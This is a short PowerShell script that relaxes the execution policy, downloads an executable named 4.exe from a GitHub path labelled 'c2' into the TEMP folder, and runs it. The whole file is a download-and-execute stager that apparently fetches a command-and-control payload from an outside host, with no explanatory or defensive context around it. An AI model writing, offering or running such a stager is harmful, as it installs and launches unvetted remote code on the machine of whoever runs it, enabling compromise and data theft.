Set-ExecutionPolicy RemoteSigned -Scope Process
# Define the URL of the EXE file
$exeUrl = "https://github.com/23younesm/c2/raw/main/4.exe"

# Define the local path where the file will be saved
$outputPath = "$env:TEMP\4.exe"

# Download the EXE file from the URL
Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath

# Run the EXE file
Start-Process $outputPath -Wait
